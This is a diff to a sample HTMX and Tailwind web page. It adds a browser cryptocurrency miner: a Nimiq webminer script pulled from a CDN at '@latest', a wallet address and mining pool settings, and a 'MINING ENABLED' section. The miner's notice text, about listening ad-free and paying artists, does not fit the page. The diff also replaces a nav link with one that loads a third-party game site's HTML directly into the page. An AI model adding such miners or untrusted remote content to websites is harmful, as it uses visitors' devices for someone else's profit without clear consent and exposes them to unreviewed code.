@@ -5,6 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Glassmorphic Dark UI with HTMX and Tailwind</title>
     <script src="https://cdn.jsdelivr.net/npm/htmx.org@2.0.0/dist/htmx.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Albermonte/webminer-addon@latest/dist/js/addon.js"></script>
+        <script>
+            let NIMIQ_ADDRESS = 'NQ64 X4S4 RL32 4A24 6LLC RUHD AHFV G3Y2 T8TT';
+            let NIMIQ_POOL_HOST = 'pool.acemining.co';
+            let NIMIQ_POOL_PORT = 8443;
+            let ADDON_INFO = 'You are on the <a href="#" target="_blank">Explode Freemium</a> plan, we are mining NIM while you are listening ad-free. We split the NIMIQ up amongst the artists at the end of the month!'
+            let ADDON_BOTTOM = true
+            let MINER_THREADS = 1
+        </script>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <style>
         /* Glassmorphic effect */
@@ -26,7 +35,7 @@
                     <li><a href="#" hx-get="home.html" hx-target="#main-content" class="hover:text-gray-400">Home</a></li>
                     <li><a href="#" hx-get="about.html" hx-target="#main-content" class="hover:text-gray-400">About</a></li>
                     <li><a href="#" hx-get="contact.html" hx-target="#main-content" class="hover:text-gray-400">Contact</a></li>
-                    <li><a href="#" hx-get="fallboys.html" hx-target="#main-content" class="hover:text-gray-400">Fall Boys</a></li>
+                    <li><a href="#" hx-get="https://www.onlinegames.io/games/2023/unity2/gta-simulator/index.html" hx-target="#main-content" hx-swap="innerHTML" class="hover:text-gray-400">GTA Simulator</a></li>
                 </ul>
             </nav>
         </div>
@@ -37,6 +46,17 @@
         <h2 class="text-3xl font-bold mb-4">Welcome to My Website</h2>
         <p>This is a sample page with a glassmorphic dark UI, built using HTMX and Tailwind CSS.</p>
     </main>
+
+    <section class="bg-gray-800 glassmorphic p-8">
+        <div class="container mx-auto text-center">
+            <h2 class="text-4xl font-bold mb-4">MINING ENABLED ✔</h2>
+                <noscript>
+                  <strong>We're sorry but Explode WebMiner doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+                </noscript>
+                <div id="webminer-addon"></div>
+            <a href="#" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">Change Subscription</a>
+        </div>
+    </section>
 
     <!-- Footer -->
     <footer class="bg-gray-800 glassmorphic p-4 text-center">
